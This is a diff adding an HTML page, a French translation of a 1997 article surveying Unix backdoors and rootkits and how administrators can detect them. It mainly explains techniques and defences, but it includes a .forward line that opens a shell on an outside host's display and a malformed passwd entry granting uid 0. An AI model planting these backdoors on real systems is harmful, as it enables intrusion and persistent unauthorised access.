@@ -1,0 +1,385 @@
+<html>
+
+<head>
+<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
+<title>Backdoors</title>
+<meta name="generator" content="Namo WebEditor v4.0(Trial)">
+</head>
+
+<body bgcolor="white" text="black" link="blue" vlink="purple" alink="red">
+            <P align=justify style="MARGIN-LEFT: 8px; MARGIN-RIGHT: 8px"><FONT 
+            color=#000000 face=Verdana size=5><FONT face=Verdana 
+            size=5>Backdoors</FONT><FONT face=Verdana size=2><BR><BR>By 
+            Christopher Klaus 8/4/97<BR>Traduit par lansciac 
+            18/01/2000<BR><BR><BR><BR>Depuis que l'informatique existe, on 
+            retrouve des rapports d'intrusion;<BR>les pirates ont essaye de 
+            d&eacute;velopper des techniques ou backdoors (trappes)<BR>qui permettent 
+            de rentrer a l'interieur des systemes. Dans cet article,<BR>nous 
+            mettrons l'accent sur les backdoors les plus connues et les 
+            moyens<BR>possibles de les d&eacute;tecter et les eliminer.<BR>La plupart 
+            de nos propos concerneront les systemes Unix avec une 
+            ouverture<BR>sur le syst&egrave;me Windows NT. Nous d&eacute;crirons le probl&egrave;me 
+            en essayent de<BR>determiner la methode qu'utilise les pirates ainsi 
+            que les methodes que les<BR>administrateurs peuvent employer pour 
+            arreter ces intrus. Lorsqu'un&nbsp;<BR>administrateur comprend 
+            combien il est difficile d'arreter des intrus<BR>qui sont deja 
+            &quot;intra muros&quot;, le comportement sur la veille 
+            securisationnelle<BR>est mieux assimile. Nous allons essayer de 
+            couvrir la&nbsp;<BR>plupart des failles utilisees par les pirates. 
+            Cependant,&nbsp;<BR>nous ne couvrirons pas toutes les failles car la 
+            creations des 'portes<BR>arrieres' est sans limites.<BR><BR><BR>Les 
+            backdoors utilisees par la plupart des pirates fournissent deux ou 
+            trois<BR>fonctions principales:<BR><BR>Etre capable de rentrer dans 
+            une machine, meme si l'administrateur essaye<BR>de le securiser, par 
+            exemple en changeant tous les mots de passe.<BR><BR>Etre capable de 
+            rentrer dans une machine en laissant le moins de 
+            traces<BR>possibles.<BR>La plupart des backdoors permettent d'etre 
+            logge sur une machine alors que cela<BR>est transparent sur la 
+            machine.<BR><BR>Etre capable de rentrer dans une machine en perdant 
+            le moins de temps possible.<BR>La plupart des pirates veulent 
+            pouvoir utiliser facilement une machine sans<BR>avoir&nbsp;<BR>a 
+            rechercher les failles de securite pour obtenir un 
+            acces.<BR><BR>Dans la plupart des cas, si le pirate pense que 
+            l'administrateur est en&nbsp;<BR>mesure de detecter une backdoor 
+            installee, il cherchera toutes les&nbsp;<BR>failles existantes pour 
+            les utiliser comme des backdoors. Cela ne concerne<BR>evidement pas 
+            celle qui pourrait avertir l'administrateur. Cependant 
+            dans<BR>quelques<BR>cas, les vulnerabilit&eacute;s d'une machine restent 
+            des portes ouvertes non connues.<BR><BR>Password Cracking 
+            Backdoor<BR><BR>Une des premieres et plus anciennes methodes pour 
+            obtenir non seulement<BR>un acces mais aussi une backdoor sur un 
+            systeme Unix etait d'utiliser un&nbsp;<BR>cracker de password. Il 
+            revele les passwords des comptes.La plupart du temps,&nbsp;<BR>les 
+            pirates utilisent des comptes qui sont laisses de cotes et qui ont 
+            des<BR>passwords faciles a trouver et les changent par des pass plus 
+            difficiles.&nbsp;<BR>Quand l'administrateur regarde les comptes, il 
+            ne&nbsp;<BR>s'appercoit pas des changements. Ainsi l'administrateur 
+            ne peut determiner<BR>quels comptes il doit fermer.<BR><BR>Rhosts + 
+            + Backdoor<BR><BR>Sur des machines en reseau dans un environnement 
+            Unix, les services comme Rsh<BR>et<BR>Rlogin utilisent une simple 
+            methode d'autentification basee sur un&nbsp;<BR>nom d'hote qui est 
+            place dans rhosts. Un utilisateur peut facilement configurer<BR>une 
+            machine pour qu'il n'y ait plus de demande d'autentification 
+            password<BR>pour se logger. Un pirate peut facilement obtenir un 
+            acces en rajoutant<BR>&quot;+ +&quot; dans le fichier de configuration de 
+            rhosts et ainsi se logger sans&nbsp;<BR>password. Cette methode est 
+            tres utilisee, surtout quand NFS exporte le&nbsp;<BR>repertoire 
+            personnel vers l'exterieur. Ces acces deviennent des 
+            backdoors<BR>qui permettent un acces facile au systeme. Beaucoup de 
+            pirates preferent&nbsp;<BR>employer Rsh plutot que Rlogin car c'est 
+            un gain de temps et de possibilites<BR>au niveau du systeme. 
+            Beaucoup d'administrateurs verifient qu'il n'y ait pas<BR>de &quot;+ +&quot; 
+            dans le fichier de configuration; cependant un pirate peut 
+            facilement,<BR>une fois qu'il a un acces, inserer un nom d'hote et 
+            un nom d'utilisateur a<BR>partir<BR>d'un autre compte asservi sur le 
+            reseau, ce qui est par consequent beaucoup<BR>plus<BR>difficile a 
+            trouver.<BR><BR>Checksum and Timestamp Backdoors<BR><BR>Depuis 
+            longtemps, les pirates remplacent les fichiers binaires des 
+            systemes<BR>Unix par leurs propres fichiers munis de trojan. 
+            Beaucoup d'administrateurs<BR>systeme se basent sur le time-stamping 
+            et le systeme de verification des&nbsp;<BR>programmes (system 
+            checksum programs), comme par exemple le programme de&nbsp;<BR>somme 
+            d'Unix (Unix's sum program), pour essayer de determiner quand 
+            un&nbsp;<BR>fichier binaire a ete modifie. Les pirates ont 
+            developpes des technologies qui&nbsp;<BR>recree la meme etiquette 
+            pour le fichier infecte que celle du fichier originale<BR>(NDT: 
+            cette etiquette est un marqueur de temps appele time-stamp qui 
+            indique<BR>la date de creation et de modification du fichier). Cette 
+            action est accomplie<BR>en bidouillant l'horloge systeme. On ramene 
+            l'horloge au moment de la creation<BR>du fichier original et on 
+            insere le fichier infecte. Une fois cette 
+            operation&nbsp;<BR>effectuee, l'horloge est remise a l'heure exacte. 
+            Le programme de somme quand a<BR>lui se base sur un checksum CRC et 
+            est facilement masque. Les pirates ont<BR>developpes des programmes 
+            qui peuvent modifier le fichier binaire infecte de&nbsp;<BR>maniere 
+            a ce qui l'est la meme checksum que le fichier original, et 
+            ainsi&nbsp;<BR>se cacher des administrateurs. La somme de 
+            verification MD5 (checksum MD5) est<BR>le choix recommande par les 
+            vendeurs de nos jours. Le MD5 est base sur un<BR>algorithme<BR>qui 
+            au jour d'aujourd'hui n'a pas donne la preuve qu'il pouvait etre 
+            singe.<BR><BR><BR>Login Backdoor<BR><BR>Sur un systeme Unix, le 
+            programme de login est un logiciel qui utilise<BR>l'autentification 
+            par password lorsque quelqu'un fait un telnet<BR>sur la machine. Les 
+            pirates s'accaparent du code source de login.c<BR>et le modifie de 
+            telle maniere que lorsque le programme verifie<BR>le pass avec le 
+            pass enregistre, il verifiera d'abord le password<BR>ouvrant la 
+            backdoor. Si l'utilisateur rentre le password activant la 
+            backdoor,<BR>il vous pourra se logger sans se soucier du fait que 
+            l'administrateur<BR>se log aussi. Ainsi, vous pouvez vous logger 
+            sous n'importe quel<BR>compte, meme celui de root. Le backdoor 
+            password pourrait multiplier<BR>les acces avant que l'utilisateur se 
+            logge et apparaisse dans<BR>utmp et wtmp. Cependant un pirate peut 
+            etre logge et avoir un acces<BR>shell sans que personne n'apparaisse 
+            comme etant logge sur la machine<BR>sous ce compte. Les 
+            administrateurs mettent en evidence ces backdoors<BR>lorsqu'ils 
+            executent des chaines de commandes pour trouver quel<BR>texte est 
+            inscrit dans le programme de login. La plupart du temps,<BR>les 
+            backdoors passwords sont ainsi mises a jour. Les pirates 
+            avises<BR>encapsulent alors leurs backdoors ou les cryptent, ce qui 
+            permet<BR>de les cacher a des commandes aussi simple. Beaucoup 
+            d'administrateur<BR>peuvent detecter ces backdoors en utilisant un 
+            checksum MD5.<BR><BR><BR>Telnetd Backdoor<BR><BR>Lorsqu'un 
+            utilisateur fait tun telnet sur une machine, le service 
+            Inetd<BR>ecoute sur le port, recoit la demande de connexion et la 
+            passe a in.telnetd,<BR>qui lance le login. Les pirates savent que 
+            les administrateurs utilisent des<BR>programmes de tampering, ils 
+            modifient donc in.telnetd. A l'interieur de<BR>in.telnetd, il y a 
+            plusieurs verifications effectuees comme le type 
+            de&nbsp;<BR>terminal que l'utilisateur emploie. D'habitude, le 
+            terminal employe est<BR>un Xterm ou un VT100. Un pirate peut creer 
+            une backdoor; lorsque le terminal<BR>a ete positionne sur &quot;letmein&quot;, 
+            il peut multiplier un shell sans requerir<BR>quelconque 
+            autentification. Les pirates installent des backdoors sur 
+            differents<BR>services ce qui leurs permet d'obtenir un shell tres 
+            facilement<BR><BR>Services Backdoor<BR><BR>Presque chaque service 
+            reseau a &agrave; une epoque etait backdoore par un pirate.<BR>Des versions 
+            backdoors de finger, rsh, rexec, rlogin, ftp, meme inetd, 
+            etc.,<BR>existeront toujours. Il existe des programmes qui ne sont 
+            rien de plus que des<BR>shells connectes sur un port TCP avec un 
+            pass pour obtenir un acces. Ces<BR>programmes<BR>remplacent de temps 
+            a autre des services comme uucp qui sont raremement 
+            usites<BR>ou<BR>sont tout simplement ajoutes au fichier inetd.conf 
+            comme un nouveau service.<BR>Les administrateurs devraient etre tres 
+            attentifs quant aux services qui sont<BR>en services et analyser les 
+            services originaux en utilisant une somme 
+            de<BR>verification<BR>basee sur du MD5 (checksum 
+            MD5).<BR><BR>Cronjob backdoor<BR><BR>Le Cronjob sous Unix planifie 
+            le lancement de certaines applications.<BR>Un pirate peut inserer 
+            une backdoor qui ouvre un shell entre 1h et 2h<BR>du matin. Pendant 
+            une heure chaque nuit, le pirate aura un acces. Il<BR>aura ainsi 
+            largement le temps de regarder les programmes qui tournent<BR>dans 
+            la table cron et installer des backdoors dans ces 
+            programmes.<BR><BR>Library backdoors<BR><BR>Presque tous les 
+            systemes unix utilisent des bibliotheques partagees.<BR>Celles-ci 
+            existent car elles executent la meme fonction pour 
+            plusieurs<BR>programmes et diminue ainsi la taille des programmes. 
+            Des pirates ont<BR>implemente<BR>des backdoors dans des routines 
+            comme crypt.c et _crypt.c qui sont utilises<BR>dans les programmes 
+            comme login.c. Ainsi, si le password de la backdoor est<BR>active, 
+            il lance un shell. Encore plus fort, si l'administrateur 
+            verifie<BR>le programme login.c par un checksum MD5, il lancera une 
+            autre backdoor<BR>et ouvrira une autre possibilite de shell. La 
+            plupart des administrateurs<BR>ne pensent pas que les bibliotheques 
+            sont des sources d'infections possibles.<BR><BR><BR>Un des problemes 
+            pour les pirates est que des administrateurs effectuent<BR>un MD5 
+            sur presque tout. Une des alternatives trouvees par les 
+            pirates<BR>est de mettre des backdors sur la routine open() et celle 
+            d'acces au fichier.<BR>Les routines infectees sont configurees pour 
+            lire les fichiers originaux,<BR>mais executent la backdoor. 
+            Cependant, lorsque le programme qui effectue<BR>la somme de 
+            verification MD5 lit ces fichiers, le resultat semble 
+            correct.<BR>Mais lorsque le systeme execute le programme, il lance 
+            le trojan. Meme la&nbsp;<BR>bibliotheque du trojan peut etre cachee 
+            aux 'yeux' d'une checksum MD5.<BR>Une des solutions pour les 
+            administrateurs est de linker les verificateurs<BR>des checksum MD5 
+            et de les utiliser sur le system. Le programme ainsi 
+            linker<BR>n'utilisera pas les bibliotheques infectees et pourra 
+            effectuer correctement<BR>les verifications.<BR><BR>Kernel 
+            backdoors<BR><BR>Le noyau d'un systeme Unix est le coeur du systeme. 
+            La meme methode<BR>que celle appliquee pour les librairies pour 
+            passer outre le checksum MD5<BR>peut etre utilisee au niveau du 
+            noyau, excepte que meme un programme protege<BR>ne sera pas dire la 
+            difference. Un kernel infecte est surement une des choses<BR>les 
+            plus dures a trouver pour un administrateur. Heuresement [pour eux], 
+            les&nbsp;<BR>scripts permettant ces infections ne sont pas encore au 
+            point ni tres repandus.<BR>Cela a cause de la complexite et la 
+            difference de chacun des noyaux.<BR><BR>File system 
+            backdoors<BR><BR>Un pirate peut vouloir archiver son butin ou ses 
+            donnees sur un serveur<BR>sans que l'administrateur ne trouve les 
+            fichiers. Ces fichiers peuvent<BR>contenir ses boites a outils ou 
+            ses scripts d'exploits, backdoors, sniffer,<BR>logs, donn&eacute;es copies 
+            comme des e-mails, des code source, etc. Pour cacher<BR>ses fichiers 
+            qui sont parfois volumineux des yeux d'un admin, un pirate<BR>peut 
+            patcher des commandes du shell comme le &quot;ls&quot;, le &quot;du&quot; et le 
+            &quot;fsck&quot;&nbsp;<BR>pour cacher l'existence de certains fichiers. A un 
+            tres bas niveau, une&nbsp;<BR>backdoor inseree par un pirate peut 
+            creer une section sur le disque dur<BR>pour avoir un format 
+            proprietaire qui sera designe comme des 
+            secteurs&nbsp;<BR>deffectueux sur le disque dur. Ainsi le pirate 
+            peut acceder au fichiers<BR>caches avec un utilitaire special, mais 
+            aux yeux de l'admin, cela sera<BR>tres dificile de discerner que des 
+            fichiers caches ont ete inserees.<BR><BR><BR>Bootblock 
+            backdoors<BR><BR>Dans le monde des PC, beaucoup de virus 
+            s'inseraient dans le secteur de&nbsp;<BR>boot et de nombreux anti 
+            virus verifiaient ce secteur pour voir si le&nbsp;<BR>secteur de 
+            boot avait ete altere. Sous Unix, la plupart des 
+            administrateurs<BR>n'ont pas d'outils pour verifier le secteur de 
+            boot, et c'est sur cela que&nbsp;<BR>compte les pirates pour inserer 
+            des backdoors dans le secteur de boot.<BR><BR>Process hiding 
+            backdoors<BR><BR>La plupart du temps un pirate veut cacher les 
+            programmes qu'il emploie.<BR>Les programmes qu'ils veulent cacher 
+            sont en general des crackers de&nbsp;<BR>password ou des sniffers. 
+            il existe plusieurs methodes et nous en avons<BR>rassemblees 
+            quelques unes:<BR><BR>Un pirate peut ecrire un programme pour 
+            modifier ses propres<BR>argv[] et le faire tourner sous un autre nom 
+            de process.<BR><BR>Un pirate peut renomer un sniffer en un autre 
+            service legitime comme<BR>in.sylog et le lancer. Ainsi lorsqu'un 
+            admin lance un &quot;ps&quot; ou regarde<BR>les process en cours, les services 
+            standards apparaissent.<BR><BR>Un pirate peut modifier les routines 
+            dans les bibliotheques ainsi &quot;ps&quot;<BR>ne montrera pas les 
+            process.<BR><BR>Un intrus peut patcher une backdoor ou un programme 
+            a l'interieur<BR>d'une routine d'interruption ainsi il n'apparaitra 
+            pas dans la&nbsp;<BR>table des processus. Un exemple de backdoor 
+            utilisant cette technique<BR>est amod.tar.gz et est disponible a 
+            l'adresse 
+            suivante:<BR>http://star.niimm.spb.su/~maillist/bugtraq.1/0777.html<BR><BR>Un 
+            pirate peut aussi modifier le noyau pour cacher certains 
+            processus.<BR><BR>Rootkit<BR><BR>Un des packages les plus connus 
+            pour installer des backdoors se nomme le&nbsp;<BR>rootkit. Il peut 
+            facilement etre trouve sur le web en le cherchant sur 
+            un&nbsp;<BR>moteur de recherche. Dans le README du rootkit, on 
+            retrouve les fichiers<BR>typiques que l'on peut installer:<BR><BR>z2 
+            - enleve les entrees dans utmp, wtmp, et lastlog.<BR>Es - Le sniffer 
+            rokstar pour les noyaux bases sur sun4.<BR>Fix - falsifie des 
+            checksums, installe avec les meme dates/perms/u/g.<BR>Sl - devenir 
+            root par un password magique envoye au login.<BR>Ic - modifie 
+            ifconfig pour enlever le drapeau de sortie PROMISC.<BR>ps: - cache 
+            les processus.<BR>Ns - modifie netstat pour cacher les connexions de 
+            certaines machines.<BR>Ls - cache certains repertoires et 
+            fichiers.<BR>du5 - cache l'espace utilise sur votre disque 
+            dur.<BR>ls5 - cache certains repertoires et 
+            fichiers.<BR><BR><BR>Network traffic backdoors<BR><BR>Non seulement 
+            les pirates veulent cacher leurs traces sur une machine, mais 
+            ils<BR>veulent aussi cacher leurs activites sur le reseau. Des 
+            backdoors reseau<BR>permettent parfois au pirate d'obtenir un acces 
+            au travers du firewall. Il y a<BR>beaucoup<BR>de programmes de 
+            backdoors reseau qui permettent aux intrus d'utiliser 
+            certains<BR>ports<BR>sur une machine ce qui leur permet de ne pas 
+            utiliser les services normaux.&nbsp;<BR>Parce que le traffic utilise 
+            des ports non standardises, l'administrateur peut<BR>surveiller le 
+            traffic du pirate. Ces backdoors reseau utilisent les 
+            services<BR>TCP, UDP et ICMP mais ils peuvent employer beaucoup 
+            d'autres sortes de paquets.<BR><BR>TCP Shell Backdoors<BR><BR>Un 
+            pirate peut mettre en place une backdoor avec un shell TCP sur de 
+            nombreux<BR>ports que le firewall ne bloquera pas. La plupart du 
+            temps, les shells sont&nbsp;<BR>proteges par un password donc si un 
+            admin essaye de se connecter, il n'aura&nbsp;<BR>pas tout de suite 
+            l'acces. Un admin peut regarder les connexions etablies 
+            et<BR>les<BR>ports qui sont a l'ecoute avec la commande netstat. La 
+            majorite de ces<BR>backdoors<BR>permettent l'emploi des technologies 
+            de TCP Wrapper. Ces backdoors peuvent<BR>utiliser le port SMTP, ce 
+            qui leurs pemet de passer au travers du firewall<BR>sans etre 
+            repere.<BR><BR>UDP Shell Backdoors<BR><BR>Un administrateur peut 
+            facilement reperer une connexion TCP, alors que<BR>dans le cas d'UDP 
+            il aura beaucoup plus de difficultes, et pour cause<BR>car celles-ci 
+            n'apparaissent pas en faisant un netstat. La plupart 
+            des<BR>firewalls sont configures pour laisser passer les packets UDP 
+            comme<BR>les services DNS par exemple. Souvent les pirates 
+            etablissent une<BR>trappe sur ce port et passent ainsi par dessus le 
+            firewall.<BR><BR>ICMP Shell Backdoors<BR><BR>La commande Ping est 
+            une des manieres les plus pratique pour savoir<BR>si une machine 
+            distante est encore vivante. Pour cela on envoie et<BR>on recoit des 
+            paquets ICMP. Beaucoup de firewall permettent a des<BR>machines 
+            externes de pinger une machine a l'interieur du reseau. Un<BR>pirate 
+            peut inserer des donnees dans un paquet ICMP qu'il 
+            enverra&nbsp;<BR>au travers d'un ping et etablir un shell au travers 
+            de ce tunnel.<BR>Un flot important de Ping peut alerter un 
+            administrateur, mais le<BR>temps qu'il analyse les donnees des 
+            paquets, le pirate aura disparu.<BR><BR>Encrypted Link<BR><BR>Un 
+            administrateur peut utiliser un sniffer pour essayer de voir 
+            quels<BR>acces sont presents sur ses machines et par la meme 
+            determiner s'il y&nbsp;<BR>a intrusion ou non. Un pirate peut aussi 
+            ajouter une encryption a sa&nbsp;<BR>trappe reseau ce qui rendra 
+            impossible de determiner ce qui est transmis<BR>entre les deux 
+            machines.&nbsp;<BR><BR><BR>Windows NT<BR><BR>Du fait que Windows Nt 
+            n'autorise pas facilement plusieurs utilisateurs<BR>sur une meme 
+            machine et des acces a distance comme sous Unix, il 
+            est&nbsp;<BR>plus difficile pour un pirate de rentrer a l'interieur 
+            de Windows NT,<BR>installer une backdoor et lancer une attaque a 
+            partir de la.<BR>C'est pour cela que vous trouverez la plupart du 
+            temps des attaques reseau<BR>lancees a partir de postes Unix plutot 
+            que de postes WindowsNT. Au fur et<BR>a mesure que Windows NT 
+            avancera dans le concept du multi-utilisateur, de 
+            meme&nbsp;<BR>augmentera la possibilite pour les pirates d'utiliser 
+            Windows NT a leur&nbsp;<BR>avantage. Assurement, si cela arrive, la 
+            plupart des backdoors utilisees<BR>sous Unix seront portees sous 
+            Windows NT et les administrateurs devraient&nbsp;<BR>s'y preparer. 
+            Aujourd'hui, on trouve deja le demon Telnet sous Windows NT.<BR>Avec 
+            de backdoors reseau, il est tres facile d'installer des trappes 
+            sous<BR>Windows NT.<BR><BR>Solutions<BR><BR>Au fur et a mesure que 
+            les technologies des backdoors avancent, il devient<BR>de plus en 
+            plus dur pour les administrateurs de determiner si un pirate<BR>a 
+            installer une trappe ou si les admins ont bien bloques les 
+            acces.<BR><BR>Evaluation<BR><BR>Une des premieres etapes consiste a 
+            analyser les faiblesses de son reseau,<BR>ce qui permet de faire 
+            ressortir les failles existantes et de les reparer.<BR>Beaucoup 
+            d'outils commerciaux existent pour scanner son reseau et 
+            mettre<BR>en evidance les failles du systeme. Les entreprises 
+            pourrait eviter<BR>des catastrophes si elles installees simplement 
+            les patchs de securite<BR>que les vendeurs mettent gratuitement a 
+            disposition.&nbsp;<BR><BR>La signature MD5&nbsp;<BR><BR>Un des 
+            composants basique et necessaire a la verification du systeme 
+            est&nbsp;<BR>la somme de verification MD5. Il faut effectuer celle 
+            ci lorsque le systeme<BR>est propre. Le fait d'effectuer une 
+            checksum sur le tard laisse emettre<BR>l'hypothese qu'un pirate a 
+            deja infecte le systeme et rend donc celle ci&nbsp;<BR>inutile. De 
+            nombreuses entreprises ont ete piratees et ont des 
+            trappes<BR>d'installees depuis de nombreux mois. La plupart du 
+            temps, meme les back up<BR>sont infectes. Quand les entreprises se 
+            rendent compte qu'elles ont ete<BR>hackees, elle font un back up 
+            dans l'espoir d'enlever ces trappes. L'effort<BR>est donc inutile 
+            car en ayant restaure tous les fichiers, elles auront 
+            aussi<BR>remis<BR>toutes les trappes. L'image de comparaison doit 
+            donc necessairement etre faite<BR>avant qu'une attaque ne se 
+            produise.<BR><BR>La detection d'intrusion<BR><BR>La detection 
+            d'intrusion devient plus important a partir du moment ou<BR>les 
+            entreprises permettent une tele-connexion a leur machine. La<BR>plus 
+            ancienne methode de detection d'intrusion se base sur l'etude des 
+            logs.<BR>La methode la plus recente quant a elle (intrusion 
+            detection system (IDS))<BR>utilise le sniffing en temps reel et 
+            l'analyse du reseau. La plupart des<BR>trappes reseau peuvent donc 
+            facilement etre detectees. la derniere technologie<BR>IDS peut 
+            verifier les paquets UDP de DNS et determiner si la demande 
+            du<BR>protocole<BR>DNS correspond avec une demande normale.Si les 
+            donnees circulant sur le port<BR>DNS<BR>ne correspondent pas avec 
+            celles du protocole DNS, un indicateur d'alerte est<BR>active<BR>et 
+            les donnees sont capturees pour permettre une analyse. Le meme 
+            principe peut<BR>etre applique aux paquets ICMP pour voir si les 
+            donnees du ping sont coherentes<BR>ou<BR>si ce sont des donnees 
+            codees d'une session shell.<BR><BR><BR>Boot from CD-ROM.<BR><BR>Les 
+            administrateurs devraient prendre en compte les possibilites de 
+            boot<BR>a partir du CD-Rom, ce qui permettrait d'eliminer la 
+            possibilite aux pirates<BR>d'installer des trappes a partir des 
+            CD-Rom. Le probleme avec cette methode<BR>reside dans le cout et le 
+            temps de la mise en place dans les 
+            grandes<BR>entreprises.<BR><BR>Etre vigilant<BR><BR>Parce que le 
+            milieu de la securite change tous les jours, avec de 
+            nouvelles<BR>vulerabilites annoncees quotidiennement et l'incessance 
+            des pirates a<BR>construire<BR>dse nouvelles attaques et techniques 
+            de trappes, il ne peut y avoir de<BR>technologie<BR>de securite 
+            effective sans une grande vigilance.<BR><BR>Etre conscient qu'il n'y 
+            a pas de defense impermeable, et qu'il n'y a pas<BR>de meilleure 
+            defense qu'une surveillance 
+            attentive.<BR><BR>-------------------------------------------------------------------------<BR><BR>On 
+            peut ajouter<BR><BR>.forward Backdoor<BR><BR>Sur les machines Unix, 
+            placer des commandes dans le fichier .forward<BR>est aussi une 
+            methode tres employee pour obtenir un acces. Pour le&nbsp;<BR>compte 
+            &quot;username&quot;, le fichier .forward doit contenir les lignes 
+            suivantes.<BR><BR>\username<BR>|&quot;/usr/local/X11/bin/xterm -disp 
+            hacksys.other.dom:0.0 -e /bin/sh&quot;<BR><BR>Une autre possibilite 
+            existe avec le fichier des alias de mail.<BR>(fichier qui se trouve 
+            frequement dans /etc/aliases). c'est une<BR>possibilite parmis tant 
+            d'autres. Ce qui est fait au dessus&nbsp;<BR>executera un script a 
+            partir du fichier forward et pourra&nbsp;<BR>recevoir des commandes 
+            a partir de stdin.<BR><BR><BR>PS: La methode ci dessus est aussi 
+            utilise pour obtenir un acces mail<BR>dans les entreprises (on 
+            considere le fait que le repertoire personnel<BR>est partage sur la 
+            machine client et le serveur).<BR><BR>&gt; utiliser smrsh peut 
+            effectivement fixer ce probleme (bien qu'il<BR>&gt; est possible que 
+            cela entraine des problemes si vous employez<BR>&gt; les filtres elm 
+            ou autorisez des programmes a se lancer 
+            automatiquement)<BR><BR><BR>---------------------------------------------------------------------------<BR><BR>Pour 
+            terminer, une derniere trappe qui peut etre trouvee:<BR><BR>lorsque 
+            un mauvais uid/gid est specifie dans /etc/password,<BR>la plupart 
+            des programmes de login ne verifieront pas<BR>ce mauvais chiffrement 
+            et atoi (NDT: array to integer() fonction)<BR>posistionnera l'uid et 
+            le gid a 0, donnant les privileges 
+            du<BR>superutilisateur.<BR><BR>exemple:<BR>rmartin:x:x50:50:R. 
+            Martin:/home/rmartin:/bin/tcsh<BR>sur un systeme Linux , 
+            l'utilisateur rmatin obtiendra l'uid 
+            0.<BR><BR>__________________________________________________________________<BR>Traduit 
+            par <A href="mailto:lansciac@madchat.org">lansciac</A> 
+            18/01/2000</FONT> </FONT></P>
+</body>
+
+</html>
